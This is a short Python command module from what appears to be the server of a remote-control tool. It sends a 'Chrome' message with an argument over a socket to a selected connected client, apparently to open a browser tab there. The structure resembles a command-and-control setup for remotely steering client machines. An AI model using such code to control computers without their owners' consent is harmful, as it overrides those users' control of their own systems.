# commands/chrome.py
from colorama import Fore, Style

requires_id = True

from Server.console_handler import inactive


def execute(conn, args, clients, id):
    inactive.clear()
    msg = 'Chrome ' + args[1]
    clients[id].sendall(bytes(msg, 'utf-8'))
    print("Opening Chrome tab on client:", id)
    inactive.set()  # Clear the event here
